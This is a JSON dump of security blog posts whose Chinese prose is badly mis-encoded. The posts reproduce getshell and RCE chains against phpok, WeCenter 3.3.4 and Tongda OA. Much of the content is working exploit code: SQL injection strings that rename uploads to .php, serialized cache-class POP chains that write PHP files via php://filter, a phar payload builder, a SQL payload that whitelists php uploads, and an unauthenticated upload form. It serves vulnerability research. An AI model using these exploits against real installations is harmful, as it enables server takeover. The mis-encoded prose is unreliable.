å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"phpokå‰å°getshell","slug":"phpokå‰å°getshell","date":"2020-03-24T03:08:23.000Z","updated":"2020-03-25T11:11:46.264Z","comments":true,"path":"2020/03/24/phpokå‰å°getshell/","link":"","permalink":"https://glotozz.github.io/2020/03/24/phpok%E5%89%8D%E5%8F%B0getshell/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• phpok4.7ä»sqlæ³¨å…¥åˆ°getshell æ¼æ´åˆ†æ POCç¼–å†™ phpok5.3çš„getshell æ¼æ´åˆ†æ POCç¼–å†™ phpok5.4.137getshell æ€è·¯ä¸€ã€é€šè¿‡sqlæ³¨å…¥æ’å…¥å°†è¦ååºåˆ—åŒ–çš„æ•°æ® æ€è·¯äºŒã€å’Œphpok4.7ä¸€æ ·é€šè¿‡sqlæ³¨å…¥æ·»åŠ ä¸Šä¼ é™„ä»¶phpç™½åå• æ€»ç»“ å‚è€ƒé“¾æ¥ phpok4.7ä»sqlæ³¨å…¥åˆ°getshellæ¼æ´åˆ†æ/framework/www/upload_control.php åŸºç¡€ä¸Šä¼ å‡½æ•°ï¼Œä¼ å…¥ä¸€ä¸ªè¡¨å•åå’Œå­˜å‚¨ç›®å½•ï¼Œè¿”å›ä¸Šä¼ ç»“æœ å…¶ä¸­$this-&gt;lib(&#39;upload&#39;)-&gt;getfile($input_name,$cateid)è¡¨ç¤ºä½¿ç”¨libsä¸‹çš„upload.phpä¸­çš„getfile()æ–¹æ³• è·Ÿè¿›getfile() ä¼ å…¥äº†ä¸Šä¼ è¡¨å•åï¼Œå°±ä¼šè¿›å…¥_upload()ï¼Œç»§ç»­è·Ÿè¿› æ¯”è¾ƒé•¿ï¼Œæ˜¯å®Œæ•´çš„ä¸Šä¼ æ“ä½œï¼ŒåŒ…æ‹¬å¼‚å¸¸æŠ›å‡ºç­‰ã€‚ å…ˆçœ‹çœ‹ä¸€å¼€å§‹çš„åç¼€åæ£€æµ‹ ç™½åå•ï¼Œå› æ­¤æ— æ³•åˆ©ç”¨ æœ€åå¦‚æœä¸Šä¼ æˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„$rsï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°$titleæ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åå³$tmpnameï¼Œå…ˆè¿”å›åˆ°getfile()ï¼Œå†å›åˆ°upload_base()ï¼Œå¦‚æœä¹‹å‰ä¸Šä¼ æˆåŠŸï¼Œä¼šæœ‰ä¸€ä¸ªæ•°æ®åº“æ“ä½œ 1$id &#x3D; $this-&gt;model(&#39;res&#39;)-&gt;save($array); è·Ÿè¿›model/res.phpçš„save()æ–¹æ³• è·Ÿè¿›engine/db/mysqli.phpçš„insert_array()æ–¹æ³• å°±æ˜¯å°†æ•°ç»„è½¬åŒ–ä¸ºinsert intoè¯­å¥ï¼Œå› ä¸ºæˆ‘ä»¬å¯æ§$titleï¼Œå› æ­¤å¯ä»¥insert intoæ³¨å…¥ã€‚ä¹‹å‰è‡ªå·±æŒ–çš„ä¸€ä¸ªæ´å°±æ˜¯æ— é€—å·çš„insert intoæ³¨å…¥ï¼Œå½“æ—¶åˆ©ç”¨ä¸‹é¢çš„æ–¹æ³•æ„é€ ç›²æ³¨ 1insert into &#96;user&#96;(id,name) (select 3,4 from another_table where case when 1 then sleep(5) else 1 end) è¿™é‡Œå¯ä»¥åˆ©ç”¨ä¸‹é¢çš„æ–¹æ³•æ’å…¥å¤šæ¡è¯­å¥ 1insert into file values(1,2,3),(4,5,6) æˆåŠŸæ’å…¥ä¸‹ä¸€æ¡è¯­å¥åï¼Œ ä¸‹ä¸€ä¸ªåˆ©ç”¨ç‚¹/framework/www/upload_control.phpçš„replace_f() é™„ä»¶ä¸Šä¼ æ›¿æ¢æ–¹æ³•ï¼Œ ä¼ oldidå»æ•°æ®åº“å¯»æ‰¾ç›¸å…³æ•°æ®ï¼Œå°†ä¸Šä¼ çš„é™„åŠ mvåˆ°oldidå¯¹åº”çš„æ•°æ®ä¸­ï¼Œæˆ‘ä»¬æ§åˆ¶$rs[&quot;filename&quot;]ä¸ºa.phpå³å¯ã€‚è¿˜æœ‰ä¸ªæ³¨æ„ç‚¹å°±æ˜¯æ–‡ä»¶åä¸èƒ½å¸¦/ï¼Œå¯ä»¥åˆ©ç”¨16è¿›åˆ¶çš„æ–¹å¼æ’å…¥ é»˜è®¤æ˜¯æ— éœ€ç™»å½•å³å¯ä¸Šä¼  å…¨å±€æœç´¢è°ƒç”¨upload_base()çš„åœ°æ–¹ phpokå¯¹æ§åˆ¶å™¨çš„è°ƒç”¨å¦‚ä¸‹ index.php admin.php api.php åˆ†åˆ«å¯¹åº” frameworkæ–‡ä»¶å¤¹ä¸‹çš„www admin apiè¿™ä¸‰ä¸ªæ–‡ä»¶å¤¹ å‚æ•°cçš„å€¼å†æ‹¼æ¥ä¸Š_control.phpå°±æ˜¯å¯¹åº”çš„æ–‡ä»¶ å¯¹åº”çš„ç±»å³{$c}_control å‚æ•°fçš„å€¼å†æ‹¼æ¥ä¸Š_få°±æ˜¯å¯¹åº”çš„æ–¹æ³• æ­¤å¤„é€šè¿‡c=upload&amp;f=saveçš„å½¢å¼è°ƒç”¨ POCç¼–å†™å…ˆéšä¾¿ä¼ ä¸ªåŒ…ç„¶ågeneral_logè§‚å¯Ÿsqlè¯­å¥ 1INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`session_id`,`user_id`,`attr`) VALUES('1','res/202003/24/','57622ea505269ecb.jpg','jpg','res/202003/24/57622ea505269ecb.jpg','1585034277','eval','lugppkouhj1fnf1oeiils8g091','','a:2:&#123;s:5:\"width\";N;s:6:\"height\";N;&#125;') æ„é€ å°†filenameæ”¹ä¸ºres/gqy.php 1eval&#39;,&#39;lugppkouhj1fnf1oeiils8g091&#39;,1,&#39;&#39;),(&#39;1&#39;,&#39;&#39;,&#39;57622ea505269ecb.jpg&#39;,&#39;jpg&#39;,0x7265732f6771792e706870,&#39;1585034277&#39;,&#39;eval&#39;,&#39;lugppkouhj1fnf1oeiils8g091&#39;,1,&#39;&#39;)#.jpg å†è°ƒç”¨replace_f()æ–¹æ³•ï¼Œæ³¨æ„1080 1?c&#x3D;upload&amp;f&#x3D;replace&amp;oldid&#x3D;1080 è®¿é—®gqy.php phpok5.3çš„getshellæ¼æ´åˆ†æPOPé“¾ å…¨å±€æœç´¢__destruct() framework/engine/cache.php è·Ÿè¿›save() å¯ä»¥æ§åˆ¶$fileåˆ©ç”¨phpä¼ªåè®®ç»•è¿‡ ååºåˆ—åŒ–è§¦å‘ç‚¹ framework/phpok_call.php å…¨å±€æœç´¢unserialize(ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸­æœ‰å¾ˆå¤šååºåˆ—åŒ–ç‚¹ï¼Œè¿™é‡Œé€‰æ‹©_format_ext_all() å…¨å±€æœç´¢è°ƒç”¨_format_ext_all()ï¼Œæ²¡æœåˆ°ã€‚ã€‚åº”è¯¥æ˜¯é€šè¿‡åŠ¨æ€æ–¹æ³•è°ƒç”¨è§¦å‘çš„ å› æ­¤ä»å‰å¾€åçœ‹ framework/api/call_control.phpçš„index_f() å‚æ•°å¯æ§ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œè·Ÿè¿›phpok() è¿™é‡Œçš„$GLOBALS[&#39;app&#39;]-&gt;call-&gt;phpok($id,$ext)å°±æ˜¯phpok_call.php::phpok() å¯ä»¥è°ƒç”¨å½“å‰ç±»ä¸­çš„æ–¹æ³•$this-&gt;mlistï¼Œä¸”å‚æ•°å¯æ§ï¼Œè¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨ä¹‹å‰çš„_format_ext_all() POCç¼–å†™ç¬¬ä¸€æ­¥ 12foreach($data as $key&#x3D;&gt;$value)&#123; if($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][&#39;is_api&#39;])&#123; è°ƒè¯•æŸ¥çœ‹call_allå‘ç°keyå–m_picplayeræ»¡è¶³æ¡ä»¶ ç¬¬äºŒæ­¥ï¼Œè·Ÿè¿›valueï¼Œ $rslist[$fid] = phpok($key,$tmpValue); $GLOBALS[&#39;app&#39;]-&gt;call-&gt;phpok($id,$ext); $call_rs = array_merge($call_rs,$rs); $this-&gt;$func($call_rs,$cache_id); $value[&#39;ext&#39;] = unserialize($value[&#39;ext&#39;]); æ„é€ ï¼Œå…¶ä¸­extæ˜¯åºåˆ—åŒ–çš„å€¼ 12$a = ['m_picplayer'=&gt;['type_id'=&gt;'format_ext_all','x'=&gt;['form_type'=&gt;'editor','content'=&gt;'1','ext'=&gt;'xx']]];echo json_encode($a); ç¬¬ä¸‰æ­¥ï¼Œç»•è¿‡exit è¿™é‡Œé€‰æ‹©base64ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è¯•è¯•rot13ã€‚ç„¶ååœ¨åŸæœ‰çš„phpexitåŸºç¡€ä¸Šæ·»åŠ base64ä»£ç ï¼Œ(è¿™é‡Œæˆ‘ä»¬ä¸ºäº†è®©å…¶æˆä¸ºå…«ä½ï¼Œæ‰€ä»¥ä»»æ„åœ¨åé¢åŠ ä¸€ä¸ªa)å¾—åˆ°ï¼Œè¿™é‡Œç»è¿‡serialize()ï¼Œæµ‹è¯•ä¸‹ä¸º10ä½éœ€è¦åŠ ä¸¤ä¸ªa 1aaPD9waHAgcGhwaW5mbygpOz8+ POC 1234567891011&lt;?phpclass cache&#123; protected $key_id = 'php://filter/write=convert.base64-decode/resource=tmp'; protected $key_list = 'aaPD9waHAgcGhwaW5mbygpOz8+'; protected $folder = '';&#125;$x = serialize(new cache);echo $x.\"\\n\";$a = ['m_picplayer'=&gt;['type_id'=&gt;'format_ext_all','x'=&gt;['form_type'=&gt;'editor','content'=&gt;'1','ext'=&gt;$x]]];echo urlencode(json_encode($a));?&gt; è®¿é—®tmp.php phpok5.4.137getshellå¯¹v5.3çš„æ¼æ´ä¿®è¡¥ V5.4.305è¿˜åœ¨framework/libs/string.phpä¸­æ·»åŠ äº†layeré»‘åå•ï¼Œæ›¿æ¢ä¸º&lt;x&gt; 1$ra1 &#x3D; array(&#39;javascript&#39;, &#39;vbscript&#39;, &#39;expression&#39;, &#39;applet&#39;, &#39;meta&#39;, &#39;xml&#39;, &#39;blink&#39;, &#39;link&#39;, &#39;style&#39;, &#39;script&#39;, &#39;embed&#39;, &#39;object&#39;, &#39;iframe&#39;, &#39;frame&#39;, &#39;frameset&#39;, &#39;ilayer&#39;, &#39;layer&#39;, &#39;bgsound&#39;, &#39;title&#39;, &#39;base&#39;); è¿™é‡Œå¯ä»¥ä½¿ç”¨aboutusç»•è¿‡ï¼Œä½†æ˜¯é€—å·ä¹Ÿè¢«æ›¿æ¢ä¸ºç©ºã€‚ã€‚ã€‚ é“¾æ¥ä¸­å¤ç°æˆåŠŸçš„æ˜¯5.4.137ï¼Œå¯ä»¥å»githubä¸Šä¸‹è½½ æ€è·¯ä¸€ã€é€šè¿‡sqlæ³¨å…¥æ’å…¥å°†è¦ååºåˆ—åŒ–çš„æ•°æ®æ¼æ´åˆ†æ æ–°ç‰ˆæœ¬æ·»åŠ çš„format()é»˜è®¤ä¼šå¯¹åŒå¼•å·è¿›è¡Œè½¬ä¹‰ å‰é¢çš„æ€è·¯ä¸å˜ï¼Œåœ¨framework/phpok_call.phpä¸­å¯»æ‰¾å…¶ä»–çš„æ–¹æ³• å‘ç°ç¬¬ä¸€è¡Œå°†åŒå¼•å·åˆè½¬ç§»å›å»äº†ã€‚è·Ÿè¿›get_all() è·Ÿè¿›query() å¯ä»¥æ‰§è¡Œä»»æ„sqlè¯­å¥ æ¥ä¸‹æ¥å¯»æ‰¾ä¸€å¤„å¯¹æ•°æ®åº“è¿›è¡Œååºåˆ—åŒ–çš„æ“ä½œ è¿˜æ˜¯åœ¨åŒä¸€å¤„è°ƒç”¨ POCç¼–å†™ åªéœ€è¦ç¨å¾®ä¿®æ”¹å³å¯ 12$a = ['m_picplayer'=&gt;['type_id'=&gt;'sql','sqlinfo'=&gt;'select 1','is_list'=&gt;true]];echo urlencode(json_encode($a)); ç®€å•åˆ†æä¸‹å¦‚ä½•æ„é€ insert into 12$project_rs = $this-&gt;model('project')-&gt;project_one($rs['site'],$rs['pid']);$flist = $this-&gt;model('module')-&gt;fields_all($project_rs['module']); æ§åˆ¶projectè¡¨çš„site_idå’ŒidæŸ¥è¯¢ï¼Œå¾—åˆ°moudleå­—æ®µä½œä¸ºä¸‹ä¸€æ¬¡æŸ¥è¯¢çš„æ¡ä»¶ã€‚ å†å»fieldsè¡¨ä¸­æ ¹æ®ftypeæŸ¥è¯¢ï¼Œå¾—åˆ°çš„ç»“æœä¸­çš„extå³æ˜¯æˆ‘ä»¬è¦ååºåˆ—åŒ–çš„åœ°æ–¹ æ’å…¥è¯­å¥ï¼Œå­˜åœ¨%00ï¼Œå°†ååºåˆ—åŒ–çš„æ•°æ®16è¿›åˆ¶å¤„ç†ä¸‹ï¼Œæ³¨æ„ç¬¬äºŒä¸ªåˆ«é€‰0 1insert into qinggan_fields values(1233,21,'a','a','varchar','a','text','a','safe',200,200,'ext',0,0,'','') POC 12345678910111213141516171819202122232425&lt;?phpfunction strToHex($str)&#123; $hex=\"\"; for($i = 0;$i &lt; strlen($str);$i++)&#123; $hex .= dechex(ord($str[$i])); if(ord($str[$i]) == 0)&#123; $hex .= '0'; &#125; &#125; $hex = strtoupper($hex); return $hex;&#125;class cache&#123; protected $key_id = 'php://filter/write=convert.base64-decode/resource=tmp'; protected $key_list = 'aaPD9waHAgcGhwaW5mbygpOz8+'; protected $folder = '';&#125;$x = serialize(new cache);$x = strToHex($x);$sql = \"insert into qinggan_fields values(1233,21,'a','a','varchar','a','text','a','safe',200,200,0x$x,0,0,'','')\";echo $sql.\"\\n\";$a = ['m_picplayer'=&gt;['type_id'=&gt;'sql','sqlinfo'=&gt;$sql,'is_list'=&gt;true]];echo urlencode(json_encode($a));?&gt; å› ä¸ºæˆ‘ä¹‹å‰ä¼ çš„ftype=21ï¼Œä¸‹ä¸€æ­¥ä¼ id=41&amp;site_id=1 1%7B%22m_picplayer%22%3A%7B%22type_id%22%3A%22fields%22%2C%22pid%22%3A41%2C%22site%22%3A1%7D%7D è®¿é—®tmp.php æ€è·¯äºŒã€å’Œphpok4.7ä¸€æ ·é€šè¿‡sqlæ³¨å…¥æ·»åŠ ä¸Šä¼ é™„ä»¶phpç™½åå•å’Œphpok4.7çš„åŒºåˆ«åœ¨äºinsert intoçš„æ³¨å…¥ç‚¹ä¸ºmime_type framework/api/upload_control.phpä¸­çš„save_f() è·Ÿè¿›_upload() å› ä¸ºæ–°ç‰ˆæœ¬ä¸­æ·»åŠ äº†format()å¯¹æ–‡ä»¶åè¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯ä¹Ÿå¢åŠ äº†mimetypeå­—æ®µï¼Œå¹¶ä¸”æˆ‘ä»¬å¯æ§ã€‚ POCç¼–å†™ æ³¨æ„è¿˜å¢åŠ äº†2å­—èŠ‚çš„æ–‡ä»¶æ ¼å¼æ£€æŸ¥ï¼ŒåŠ ä¸Šå¯¹åº”å³å¯ æ¯”å¦‚png=&gt;&#39;13780&#39;=&gt;%89P å…ˆéšä¾¿ä¼ ä¸ªåŒ…ç„¶ågeneral_logè§‚å¯Ÿsqlè¯­å¥ 1INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`mime_type`,`attr`,`session_id`,`user_id`) VALUES('1','res/202003/25/','','png','res/202003/25/beb3a68f4f90a030.png','1585119315','eval','image/jpeg','a:2:&#123;s:5:\"width\";N;s:6:\"height\";N;&#125;','6joq7hdmh7gf5bqrsphpc1via7','0') æ„é€ å°†mimetypeæ”¹ä¸ºres/gqy.php 1eval&#39;,&#39;l&#39;,1,&#39;1&#39;),(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;jpg&#39;,0x7265732f6771792e706870,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;10&#39;,&#39;1&#39;)# ï¼ˆapi/upload_control.phpä¸­åªæœ‰save_f()æ–¹æ³•ï¼‰ å†è°ƒç”¨www/upload_control.phpä¸­çš„replace_f()æ–¹æ³•ï¼Œæ³¨æ„1422 1index.php?c&#x3D;upload&amp;f&#x3D;replace&amp;oldid&#x3D;1422 è®¿é—®/res/gqy.php æ€»ç»“ç°åœ¨ä¼ ç»Ÿçš„getshellå¾ˆå°‘ç›´æ¥å‡ºç°ã€‚åˆ©ç”¨sqlæ³¨å…¥ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åï¼Œä¿®æ”¹æ•°æ®åº“ä¸­å¯¹ä¸Šä¼ æ–‡ä»¶æ ¼å¼çš„è®¾ç½®ï¼Œå‘ç°sqlæ³¨å…¥ä¹‹åå¯ä»¥å¾€è¿™æ–¹é¢è€ƒè™‘èƒ½å¦æ‰©å¤§å±å®³ã€‚ å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/1569 https://forum.90sec.com/t/topic/728/10 https://www.anquanke.com/post/id/194453","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"WeCenter_v3.3.4æ¼æ´åˆ†æ","slug":"WeCenter-v3-3-4æ¼æ´åˆ†æ","date":"2020-03-23T02:02:41.000Z","updated":"2020-04-02T03:48:32.812Z","comments":true,"path":"2020/03/23/WeCenter-v3-3-4æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2020/03/23/WeCenter-v3-3-4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ ååºåˆ—åŒ–è§¦å‘ç‚¹ POPé“¾ æ¼æ´ä¿®å¤ æ€»ç»“ å‚è€ƒé“¾æ¥ ååºåˆ—åŒ–ç‚¹å¯ä»¥ä»ä¸¤ä¸ªæ–¹å‘è¿›è¡Œå¯»æ‰¾ï¼Œä¸€ç§æ˜¯ç›´æ¥æœå¯æ§çš„ unserialize(å¯æ§) ï¼Œå¦ä¸€ç§æ˜¯å®Œå…¨å¯æ§çš„æ–‡ä»¶åï¼ˆåˆ©ç”¨ phar:// åè®®è§¦å‘ååºåˆ—åŒ–ï¼‰ã€‚ ç¯å¢ƒæ­å»º http://www.wecenter.com/downloads/ æ¼æ´åˆ†æapi/admin_notify.phpæœ‰ä¸ªæ˜æ˜¾çš„XSSæ¼æ´ ååºåˆ—åŒ–è§¦å‘ç‚¹å…¨å±€æœç´¢unserialize( å…¨å±€æœç´¢èƒ½è§¦å‘pharååºåˆ—åŒ–çš„å‡½æ•° å…ˆå¯¹é“¾æ¥ä¸­çš„æ¼æ´è¿›è¡Œåˆ†æï¼Œå› ä¸ºç»“æœè¾ƒå¤šï¼Œå†è¿›è¡Œå…¶ä»–çš„æ¼æ´æŒ–æ˜ models/account.php å…¨å±€æœç´¢è°ƒç”¨associate_remote_avatar() app/account/ajax.phpå¤„å¯è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå¦å¤–å‡ å¤„ä¼¼ä¹æ˜¯ç¬¬ä¸‰æ–¹ç™»å½•æä¾› ä»users_weixinè¡¨ä¸­å¾—åˆ°çš„headimgurlå­—æ®µå€¼ï¼Œå…¨å±€å¯»æ‰¾è¿™å¼ è¡¨çš„updateæˆ–è€…insertæ“ä½œ models/openid/weixin/weixin.php å…¨å±€æœç´¢bind_account() è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ§åˆ¶cookieå³å¯æ’å…¥æ•°æ®åº“ï¼Œé…åˆä¹‹å‰çš„file_get_contents()è§¦å‘pharååºåˆ—åŒ– POPé“¾å…¨å±€æœç´¢__destruct()å’Œ__construct() ä»»æ„æ–‡ä»¶åˆ é™¤ models/excel/PHPExcel/Shared/XMLWriter.php æˆ–è€…system/Zend/Http/Response/Stream.phpä¹Ÿå­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤ EXP 12345678910111213141516&lt;?php class PHPExcel_Shared_XMLWriter&#123; //ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„a.txt private $tempFileName = '../../../../../a.txt'; &#125; @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ $o = new PHPExcel_Shared_XMLWriter(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; è¿™é‡Œæ³¨æ„ä¸èƒ½åœ¨å¤´åƒå¤„è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå› ä¸º å¾—åˆ°è·¯å¾„ 1&#x2F;WeCenter_3-3-4&#x2F;uploads&#x2F;question&#x2F;20200323&#x2F;251b7693d9eaabaad4a4c05e5227ada2.gif ç”Ÿæˆjson 1234567&lt;?php $arr = []; $arr['access_token']['openid'] = 1; $arr['access_user']['nickname'] = 'gqy'; $arr['access_user']['headimgurl'] = 'phar://uploads/question/20200323/251b7693d9eaabaad4a4c05e5227ada2.gif'; echo json_encode($arr);?&gt; æ·»åŠ Cookieå¹¶è®¿é—®/app/m/weixin.phpçš„binding_action é€šè¿‡ä¸‹é¢çš„urlæ ¼å¼è°ƒç”¨æ–¹æ³• 1&#x2F;WeCenter_3-3-4&#x2F;?&#x2F;m&#x2F;weixin&#x2F;binding&#x2F; Cookie 1vmp__WXConnect&#x3D;&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:1&#125;,&quot;access_user&quot;:&#123;&quot;nickname&quot;:&quot;gqy&quot;,&quot;headimgurl&quot;:&quot;phar:\\&#x2F;\\&#x2F;uploads\\&#x2F;question\\&#x2F;20200323\\&#x2F;79595eac2a24794833379d4945e73c3c.gif&quot;&#125;&#125; å†è°ƒç”¨app/account/ajax.phpçš„synch_img_action()æ–¹æ³• 1&#x2F;WeCenter_3-3-4&#x2F;?&#x2F;account&#x2F;ajax&#x2F;synch_img&#x2F; ä½†æ˜¯å‘ç°ç¬¬ä¸€å¤„ä»»æ„æ–‡ä»¶åˆ é™¤å¹¶ä¸å¯è¡Œï¼Œåœ¨åŠ è½½ç±»æ—¶å¹¶æ²¡æœ‰æˆåŠŸï¼Œç®€å•è·Ÿäº†ä¸€ä¸‹æ²¡è·Ÿå‡ºæ¥ã€‚ã€‚ã€‚ å†è¯•è¯•ç¬¬äºŒå¤„ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œ èƒ½è¿›å…¥åŠ è½½ç±»å¹¶è¿›å…¥__destruct()ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡åˆ é™¤æˆåŠŸï¼ŒåŸå› ä¸æ¸…æ¥š SQLæ³¨å…¥ system/aws_model.inc.php 123class AWS_MODEL&#123; private $_shutdown_query = ['gqy'=&gt;'SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)'];&#125; RCE å‘ç°åœ¨åå°å­˜åœ¨ä¸€å¤„è®¾ç½®ä¸Šä¼ ç™½åå•çš„åœ°æ–¹ æ·»åŠ ä¸€ä¸ªgqyyï¼Œé€šè¿‡æŸ¥çœ‹sqlæ‰§è¡Œè¯­å¥å¯ä»¥å‘ç°æ˜¯ é‚£ä¹ˆç›´æ¥æ·»åŠ ä¸€ä¸ªphpè¿›å»å³å¯ï¼Œæ³¨æ„è½¬ä¹‰ 123class AWS_MODEL&#123; private $_shutdown_query = ['UPDATE `aws_system_setting` SET `value` = \\'s:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";\\' WHERE (`varname` = \\'allowed_upload_types\\')'];&#125; æ¼æ´ä¿®å¤v3.3.5å®˜æ–¹ä»æœªä¿®å¤ã€‚ã€‚å¯ä»¥é€šè¿‡å¯¹headimgurlè¿›è¡Œæ­£åˆ™åŒ¹é…ç¦æ­¢phar:// æ€»ç»“æ•´ä½“æŒ–æ˜æ€è·¯è¿˜æ˜¯å¾ˆèµçš„ï¼Œå°±æ˜¯é‡åˆ°ä¸€äº›å¥‡æ€ªçš„å‘ï¼Œè¿˜æ²¡è§£å†³ã€‚ã€‚ã€‚ ä¹‹åæŒ–æ˜ä¸€ä¸‹v3.3.5çš„è¯•è¯• å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/7077 https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/#%E6%BC%8F%E6%B4%9E%E7%82%B9","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"é€šè¾¾OAæœ€æ–°æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«RCE","slug":"é€šè¾¾OAæœ€æ–°æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«RCE","date":"2020-03-22T00:52:11.000Z","updated":"2020-03-25T08:06:56.552Z","comments":true,"path":"2020/03/22/é€šè¾¾OAæœ€æ–°æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«RCE/","link":"","permalink":"https://glotozz.github.io/2020/03/22/%E9%80%9A%E8%BE%BEOA%E6%9C%80%E6%96%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´å¤ç° æ¼æ´åˆ†æ æ³¨æ„ç‚¹ æ€»ç»“ å‚è€ƒé“¾æ¥ å‰ä¸¤å¤©çˆ†å‡ºäº†é€šè¾¾OAçš„RCEæ¼æ´ï¼Œåˆ†æä¸€ä¸‹æ¼æ´æˆå› ã€‚ ç¯å¢ƒæ­å»º http://www.tongda2000.com/ å½±å“ç‰ˆæœ¬ tongdaOA V11tangdaOA 2017tangdaOA 2016tangdaOA 2015tangdaOA 2013 å¢å¼ºç‰ˆtangdaOA 2013 é€šè¾¾OAçš„phpæ–‡ä»¶é‡‡ç”¨çš„æ˜¯zend54 åŠ å¯†ï¼Œå¯ä»¥ä½¿ç”¨ SeayDzendå·¥å…·è¿›è¡Œè§£å¯† æ¼æ´å¤ç°æ–‡ä»¶ä¸Šä¼  è·¯å¾„/ispirit/im/upload.php æ–‡ä»¶åŒ…å« è·¯å¾„/ispirit/interface/gateway.php æœªæˆåŠŸï¼Œå…ˆåˆ†æå†å›æ¥çœ‹æ˜¯ä¸ºä»€ä¹ˆ æ¼æ´åˆ†æ/ispirit/im/upload.php æ¯”è¾ƒè¡¥ä¸å‰åçš„ä¸åŒ auth.phpæ˜¯ç”¨æˆ·è®¤è¯ï¼Œæ‰€ä»¥æœªä¿®å¤å‰é€šè¿‡ä¼ å…¥$På³å¯ç»•è¿‡ç™»å½•éªŒè¯ï¼Œ$Pçš„æ„æ€æ˜¯sessionid æ¥ä¸‹æ¥éœ€è¦ç»•è¿‡ä¸€äº›ç®€å•çš„åˆ¤æ–­ï¼Œ$DEST_UIDåªèƒ½æ˜¯æ•°å­—å’Œé€—å·ç»„æˆï¼Œå­˜åœ¨é€—å·åˆ™intval()å¤„ç†ï¼Œä¼ ä¸º0æ—¶ï¼ŒUPLOAD_MODEä¸èƒ½ä¸º2 if (1 &lt;= count($_FILES))å³å¯æ–‡ä»¶ä¸Šä¼  è·Ÿè¿›upload()å‡½æ•° è·Ÿè¿›is_uploadable() åç¼€ä¸èƒ½ä¸ºphpï¼Œä»¥åŠé»‘åå•éªŒè¯ã€‚æˆ‘ä»¬ä¼ phtmlï¼Œæˆ–è€…jpgï¼Œé…åˆæ–‡ä»¶åŒ…å«ã€‚äº‹å®ä¸Šè¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„æ— æ³•ç›´æ¥è®¿é—®ï¼Œåªèƒ½é€šè¿‡æ–‡ä»¶åŒ…å« æ„é€ å¦‚ä¸‹ 1234567&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input name&#x3D;&quot;UPLOAD_MODE&quot; value&#x3D;&quot;1&quot;&#x2F;&gt; &lt;input name&#x3D;&quot;P&quot; value&#x3D;&quot;123&quot;&#x2F;&gt; &lt;input name&#x3D;&quot;DEST_UID&quot; value&#x3D;&quot;1&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;ATTACHMENT&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;ä¸Šä¼ æ–‡ä»¶&quot; &#x2F;&gt;&lt;&#x2F;form&gt; /ispirit/interface/gateway.php ä¿®å¤åè¿‡æ»¤äº†..é˜²æ­¢ç›®å½•ç©¿è¶Š ä¼ 